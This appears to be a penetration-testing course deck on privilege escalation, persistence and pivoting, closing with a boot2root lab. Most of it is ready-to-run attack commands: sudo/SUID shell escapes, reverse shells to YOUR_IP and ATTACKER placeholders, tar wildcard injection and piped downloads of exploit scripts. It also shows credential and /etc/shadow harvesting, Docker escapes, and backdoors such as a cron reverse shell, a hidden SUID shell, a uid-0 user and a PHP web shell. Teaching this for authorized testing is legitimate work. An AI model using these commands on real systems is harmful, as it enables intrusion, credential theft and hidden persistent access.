# Privilege Escalation & Persistence

## From Low-Privilege Shell to Root

---

## Privilege Escalation Overview

```text
Initial Access (www-data, apache)
         |
         v
   Local Enumeration
         |
    +----+----+
    |         |
    v         v
  Linux     Windows
  PrivEsc   PrivEsc
    |         |
    v         v
  Root      SYSTEM/Admin
         |
         v
   Persistence
         |
         v
   Pivoting
```

---

## Linux Enumeration for PrivEsc

```bash
# Current user and groups
id
whoami
groups

# System information
uname -a
cat /etc/os-release
cat /proc/version

# Other users on the system
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow  # If readable = jackpot

# Sudo permissions
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/something

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Running processes
ps aux | grep root
```

---

## Linux PrivEsc - Sudo Abuse

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:

# sudo vim
sudo vim -c '!bash'

# sudo find
sudo find / -exec /bin/bash \;

# sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo less/more
sudo less /etc/shadow
# Then type: !bash

# sudo nmap (older versions)
sudo nmap --interactive
# Then: !sh

# sudo env
sudo env /bin/bash

# Reference: GTFOBins (gtfobins.github.io)
# Lists hundreds of binaries exploitable via sudo/SUID
```

---

## Linux PrivEsc - SUID Exploitation

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Common SUID exploits:

# Custom SUID binary with path injection
# If a SUID binary calls a command without full path:
strings /usr/local/bin/custom-suid
# Output shows: system("service apache restart")

# Exploit via PATH manipulation:
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/custom-suid
# Now runs /tmp/service as root = root shell!

# SUID binary with library injection
# Check for missing shared libraries
ldd /usr/local/bin/suid-binary
# If a library is missing, create it:
gcc -shared -o /path/to/missing/lib.so exploit.c
```

---

## Linux PrivEsc - Kernel Exploits

```bash
# Check kernel version
uname -r
cat /proc/version

# Search for known exploits
searchsploit "Linux Kernel" $(uname -r | cut -d'-' -f1)

# Famous kernel exploits:
# DirtyCow (CVE-2016-5195) - Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8+, < 5.16.11
# PwnKit (CVE-2021-4034) - Polkit/pkexec

# DirtyPipe example:
gcc exploit.c -o dirty_pipe
./dirty_pipe /etc/passwd 1 "${replacement_line}"

# PwnKit example:
curl -fsSL https://raw.githubusercontent.com/.../PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit  # Instant root shell

# Automated enumeration
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t
```

---

## Linux PrivEsc - Cron Job Abuse

```bash
# Check for writable cron scripts
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# If /opt/scripts/backup.sh is writable:
echo 'bash -i >& /dev/tcp/YOUR_IP/5555 0>&1' >> /opt/scripts/backup.sh
# Wait for cron to execute = root reverse shell

# Wildcard injection in cron
# If cron runs: tar czf /backup/files.tar.gz *
# In the working directory, create:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/YOUR_IP/5555 0>&1' > shell.sh
# tar processes these filenames as command-line flags!

# Check for cron PATH manipulation
# If PATH in crontab includes writable directory
# Create command with same name in writable dir
```

---

## Linux PrivEsc - Password Mining

```bash
# Search for passwords in files
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "password" /home/ 2>/dev/null
grep -ri "password" /opt/ 2>/dev/null

# Common password locations
cat /var/www/html/config.php
cat /var/www/html/.env
cat /opt/app/settings.py
cat /home/*/.bash_history
cat /home/*/.mysql_history

# Database connection strings
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.yml" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.env" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

---

## LinPEAS - Automated Enumeration

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# LinPEAS checks:
# - System information and kernel version
# - Available software and versions
# - Environment variables and configs
# - Running processes and services
# - Cron jobs and timers
# - SUID/SGID binaries
# - Writable files and directories
# - SSH key information
# - Docker/LXC containers
# - Password files and credentials
# - Network information
# - User enumeration

# Color coding:
# RED/YELLOW = Almost sure it's a PE vector
# RED = 95% sure
# GREEN = Interesting but not necessarily exploitable
```

---

## Persistence Techniques

```bash
# 1. SSH authorized_keys
mkdir -p /root/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 2. Cron job backdoor
echo "* * * * * root bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /etc/crontab

# 3. SUID shell
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell
# Access: /tmp/.hidden_shell -p

# 4. Add user with root privileges
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd

# 5. Web shell (for web servers)
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# NOTE: In real engagements, persistence must be
# explicitly authorized and carefully documented
```

---

## Pivoting to Other Systems

```bash
# After compromising one system, move to others

# 1. Network discovery from compromised host
ip a
arp -a
cat /etc/hosts
netstat -tlnp

# 2. Port scanning from compromised host
# Upload a static nmap binary or use bash:
for port in 22 80 443 3306 8080; do
  (echo >/dev/tcp/10.0.0.2/$port) 2>/dev/null && \
    echo "Port $port open on 10.0.0.2"
done

# 3. SSH tunneling
ssh -L 8080:10.0.0.2:80 user@compromised_host
# Now access http://localhost:8080 to reach internal server

# 4. SOCKS proxy
ssh -D 9050 user@compromised_host
# Configure browser to use SOCKS proxy localhost:9050
# Browse internal network through the tunnel

# 5. Chisel (HTTP tunnel)
# On attacker: ./chisel server -p 8000 --reverse
# On target: ./chisel client YOUR_IP:8000 R:socks
```

---

## Windows Privilege Escalation

```cmd
:: Windows enumeration commands
whoami /all
systeminfo
net user
net localgroup administrators
wmic service list brief
schtasks /query /fo TABLE
icacls "C:\Program Files"

:: Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

:: Check for writable service binaries
sc query state= all | findstr "SERVICE_NAME"
icacls "C:\path\to\service.exe"

:: AlwaysInstallElevated (MSI privilege escalation)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Automated enumeration
:: winPEAS.exe
:: PowerUp.ps1 (PowerSploit)
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

---

## Capabilities and Docker Escapes

```bash
# Linux capabilities - fine-grained root permissions
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid  -> Change UID (instant root)
# cap_net_raw -> Raw socket access
# cap_dac_override -> Bypass file permissions
# cap_sys_admin -> Mount filesystems, etc.

# Example: Python with cap_setuid
/usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Docker escape - if you're inside a container:
# Check if in Docker
cat /.dockerenv 2>/dev/null && echo "In Docker!"
cat /proc/1/cgroup | grep docker

# Privileged container escape
# If --privileged flag was used:
mkdir /tmp/escape && mount /dev/sda1 /tmp/escape
chroot /tmp/escape bash
# Now you're on the host!

# Docker socket mount escape
# If /var/run/docker.sock is mounted:
docker run -v /:/host -it ubuntu chroot /host bash
```

---

## Password Cracking Reference

```bash
# Identify hash types
hashid '$6$salt$hash...'
hash-identifier

# Common hash formats for hashcat:
# -m 0     MD5
# -m 100   SHA1
# -m 500   MD5crypt ($1$)
# -m 1400  SHA256
# -m 1800  SHA512crypt ($6$)
# -m 3200  bcrypt ($2*$)
# -m 5600  NetNTLMv2
# -m 13100 Kerberos TGS (Kerberoast)
# -m 18200 Kerberos AS-REP (AS-REP Roast)

# hashcat usage
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for more coverage
hashcat -m 1800 -a 0 hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt  # Show cracked passwords
```

---

## GTFOBins Quick Reference

```bash
# GTFOBins: Unix binaries that can be exploited for privesc
# https://gtfobins.github.io/

# If any of these have SUID or sudo:
# File read:
sudo awk 'BEGIN {while ((getline < "/etc/shadow") > 0) print}'
sudo base64 /etc/shadow | base64 -d
sudo curl file:///etc/shadow
sudo find / -name shadow -exec cat {} \;

# Shell:
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo vim -c '!bash'
sudo less /etc/passwd  # then !bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find . -exec /bin/bash \;
sudo nmap --interactive  # then !sh (old versions)
sudo env /bin/bash

# Reverse shell via SUID binary:
sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

---

## Automated Privilege Escalation Tools

```bash
# LinPEAS - Most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum - Simpler alternative
./LinEnum.sh -t

# linux-exploit-suggester - Find kernel exploits
./linux-exploit-suggester.sh

# pspy - Monitor processes without root
./pspy64
# Shows cron jobs and processes run by other users
# Even if you can't read crontab!

# unix-privesc-check
./unix-privesc-check standard

# Windows equivalents:
# winPEAS.exe / winPEAS.bat
# PowerUp.ps1 (PowerSploit)
# Seatbelt.exe (GhostPack)
# SharpUp.exe (GhostPack)
# BeRoot.py
```

---

## Boot2Root Full Walkthrough Summary

```text
1. SCAN
   nmap -sV -sC -p- target -> Found port 80, 22

2. ENUMERATE
   gobuster -> Found /admin, /uploads, /backup
   whatweb -> WordPress 5.4, PHP 7.4

3. EXPLOIT
   wpscan -> Found vulnerable plugin
   Exploit -> Upload web shell
   Web shell -> Reverse shell as www-data

4. ESCALATE
   sudo -l -> Can run /usr/bin/python3 as root
   sudo python3 -c 'import os; os.system("/bin/bash")'
   -> ROOT!

5. CAPTURE
   cat /root/flag.txt -> FLAG{congrats_you_rooted_it}

6. DOCUMENT
   Write report with all steps and evidence
```

---

## Lab: Boot2Root Challenge

**Objectives**:
1. Scan the target and enumerate all services
2. Find and exploit a web vulnerability
3. Get an initial shell on the target
4. Escalate privileges to root
5. Capture the flag in `/root/flag.txt`

**Rules**:
- Only attack the designated target
- Document every step
- Try to use multiple techniques
- Ask for hints if stuck for more than 20 minutes

---

## Summary

- Privilege escalation is about finding misconfigurations
- `sudo -l` and SUID binaries are the most common vectors
- Password mining in config files yields easy wins
- Kernel exploits are a last resort (may crash the system)
- LinPEAS automates enumeration
- Persistence requires explicit authorization
- Pivoting extends the attack to internal networks

> Next: Final CTF Exercise
